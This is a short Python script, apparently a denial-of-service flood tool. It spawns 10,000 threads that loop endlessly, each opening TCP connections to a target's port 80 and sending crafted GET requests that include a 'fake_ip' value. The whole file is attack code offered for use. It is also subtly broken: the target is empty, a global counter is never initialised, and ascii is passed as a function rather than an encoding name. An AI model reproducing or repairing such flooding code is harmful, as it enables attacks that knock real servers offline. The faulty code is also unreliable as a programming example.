import threading
import socket

target = ''
port = 80
fake_ip = '103.196.28.152'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode(ascii),(target, port))
        s.sendto(("GET /" + fake_ip + "\r\n\r\n").encode(ascii),(target, port))

        global already_connected
        already_connected += 1
        print(already_connected)

for i in range(10000):
    thread = threading.Thread(target=attack)
    thread.start()


